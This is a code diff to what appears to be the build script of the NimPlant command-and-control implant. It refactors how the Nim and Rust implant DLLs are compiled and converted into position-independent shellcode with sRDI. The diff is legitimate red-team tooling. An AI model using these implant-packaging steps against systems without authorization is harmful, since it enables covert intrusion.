@@ -79,6 +79,38 @@ def get_xor_key(force_new=False):
     return xor_key
 
 
+def shellcode_from_dll(lang, xor_key, config, debug=False):
+    if lang == "nim":
+        dll_path = "client/bin/NimPlant.dll"
+        if debug:
+            compile_function = compile_nim_debug
+        else:
+            compile_function = compile_nim
+    elif lang == "rust":
+        dll_path = "client-rs/bin/nimplant.dll"
+        if debug:
+            compile_function = compile_rust_debug
+        else:
+            compile_function = compile_rust
+
+    if not os.path.isfile(dll_path):
+        compile_function("dll", xor_key, config)
+    else:
+        # Compile a new DLL implant if no recent version exists
+        file_mod_time = os.stat(dll_path).st_mtime
+        last_time = (time.time() - file_mod_time) / 60
+
+        if not last_time < 5:
+            compile_function("dll", xor_key, config)
+
+    # Convert DLL to PIC using sRDI
+    with open(dll_path, "rb") as f:
+        shellcode = ConvertToShellcode(f.read(), HashFunctionName("Update"), flags=0x4)
+
+    with open(os.path.splitext(dll_path)[0] + ".bin", "wb") as f:
+        f.write(shellcode)
+
+
 def compile_implant(implant_type, binary_type, xor_key):
     # Parse config for certain compile-time tasks
     config_path = os.path.abspath(
@@ -177,28 +209,14 @@ def compile_nim(binary_type, xor_key, config, debug=False):
         os.system(compile_command)
 
     elif binary_type == "raw":
-        if not os.path.isfile("client/bin/NimPlant.dll"):
-            compile_nim("dll", xor_key, config)
-        else:
-            # Compile a new DLL NimPlant if no recent version exists
-            file_mod_time = os.stat("client/bin/NimPlant.dll").st_mtime
-            last_time = (time.time() - file_mod_time) / 60
-
-            if not last_time < 5:
-                compile_nim("dll", xor_key, config)
-
-        # Convert DLL to PIC using sRDI
-        dll = open("client/bin/NimPlant.dll", "rb").read()
-        shellcode = ConvertToShellcode(dll, HashFunctionName("Update"), flags=0x4)
-        with open("client/bin/NimPlant.bin", "wb") as f:
-            f.write(shellcode)
+        shellcode_from_dll("nim", xor_key, config, debug)
 
 
 def compile_rust_debug(binary_type, xor_key, config):
     compile_rust(binary_type, xor_key, config, debug=True)
 
 
-def compile_rust(binary_type, _xor_key, config, debug=False):
+def compile_rust(binary_type, xor_key, config, debug=False):
     # TODO: Argparse
     # TODO: Update CI/CD (+yara?)
 
@@ -246,9 +264,8 @@ def compile_rust(binary_type, _xor_key, config, debug=False):
             target_path = target_path + "nimplant.dll"
             compile_command = compile_command + " --lib"
         case "raw":
-            # TODO: Shellcode
-            print("RUST SHELLCODE NOT YET IMPLEMENTED.")
-            exit(1)
+            shellcode_from_dll("rust", xor_key, config, debug)
+            return
 
     # Sleep mask enabled only if defined in config.toml
     sleep_mask_enabled = config["nimplant"]["sleepMask"]
@@ -267,15 +284,16 @@ def compile_rust(binary_type, _xor_key, config, debug=False):
     # Post-processing: move artifacts to `client-rs/bin`
     # We do this because --out-dir is considered unstable for some reason :(
     # https://doc.rust-lang.org/cargo/commands/cargo-build.html#output-options
-    bin_path = f"client-rs/bin/{os.path.basename(target_path)}"
+    if binary_type != "raw":
+        bin_path = f"client-rs/bin/{os.path.basename(target_path)}"
 
-    if not os.path.exists("client-rs/bin"):
-        os.makedirs("client-rs/bin")
+        if not os.path.exists("client-rs/bin"):
+            os.makedirs("client-rs/bin")
 
-    if os.path.exists(bin_path):
-        os.remove(bin_path)
+        if os.path.exists(bin_path):
+            os.remove(bin_path)
 
-    os.rename(target_path, bin_path)
+        os.rename(target_path, bin_path)
 
 
 def main():
